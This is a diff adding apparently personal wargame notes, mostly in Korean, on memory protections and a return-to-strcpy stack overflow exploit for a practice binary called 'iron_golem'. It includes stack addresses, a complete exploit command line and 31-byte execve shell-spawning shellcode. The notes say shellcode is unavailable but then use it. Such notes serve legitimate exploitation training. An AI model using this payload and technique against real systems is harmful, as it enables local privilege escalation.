@@ -1,0 +1,64 @@
+<메모리 보호기법>
+
+	1. DEP/비-실행 스택
+	* DEP: Data Execution Prevention
+	* Non-Executable Stack
+	
+	2. Random Mem/ASLR: 메모리가 계속 바뀜
+	* ASLR: Address Space Layout Randomization
+	* Random Mem
+
+	3. Ascii armor: 라이브러리의 시작주소가 항상 0x00??????
+		- 즉 rtl 불가
+
+	번외. 스택 카나리(스택 가드)
+		- 버퍼와 리턴영역 사이에 카나리 값을 넣어서 변조를 확인
+
+</메모리 보호기법>
+
+<conditions>
+	1. shellcode is not available
+	2. RTL to dinamic library is not available.
+	3. system 함수는 해당 버전 이후, 실행할 때 권한을 낮춤.
+	but execve, exe line function is available.
+	4. 인자를 구성할 수 없음.
+</conditions>
+
+<design>
+	ret주소에 code 내에 있는 call strcpy 주소를 쓰고
+	beyond에 지금 strcpy를 하고 있는 code의 주소 + 5를 
+	beyond + 4에 shellcode의 주소를 쓴다.
+	그럼 strcpy는 ret할 때 call하면서 저장한 즉
+	shellcode가 위치한 코드를 실행한다.
+	
+</design>
+
+<call strcpy>
+	0x8048421
+</call strcpy>
+
+<strcpy plt>
+	0x8048318
+</strcpy plt>
+
+<ebp, ret>
+	ebp: 0xfeef8b08
+	ret: 0xfeef8b0c
+	ebp - 264: 0xfeef8a00
+	ebp - 264 - 8: 0xfeef89f8
+	ebp - 264 + 8: 0xfeef8a08
+</ebp, ret>
+
+<command>
+	./iron_golem "$(printf "\x26\x84\x04\x08")$(printf "\x08\x8a\xef\xfe")$(printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x50\x8d\x5c\x24\x04\x53\xb0\x0b\x8b\x1c\x24\x8d\x0c\x24\x31\xd2\xcd\x80")$(for x in `seq 1 225`; do printf "\x90"; done)$(printf "\xf8\x89\xef\xfe")$(printf "\x21\x84\x04\x08")"
+</command>
+
+0xfef6b7f8
+0xfef1d0c8
+
+<shellcode2>
+	\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x50\x8d\x5c\x24\x04\x53\xb0\x0b\x8b\x1c\x24\x8d\x0c\x24\x31\xd2\xcd\x80
+
+	length: 31
+</shellcode2>
+
